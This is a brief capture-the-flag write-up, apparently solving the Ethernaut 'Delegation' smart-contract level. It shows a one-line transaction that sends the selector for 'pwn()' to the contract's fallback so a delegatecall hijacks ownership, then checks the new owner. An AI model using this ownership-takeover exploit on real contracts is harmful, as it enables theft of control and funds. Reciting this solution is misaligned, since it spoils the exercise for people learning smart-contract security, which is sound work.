Idea is to somehow call Delegate.pwn() which is where owner is changed. We can do this by calling Delegation.(fallback) by sending a function in the msg.data field (or first 4 bytes of the hash of the function signature, to be precise).

contract.sendTransaction({data: web3.sha3("pwn()").slice(0,10)})

To verify changed owner:
await contract.owner()
"0x6ba166580bd6989f2cad8b5245d269b845694baf"

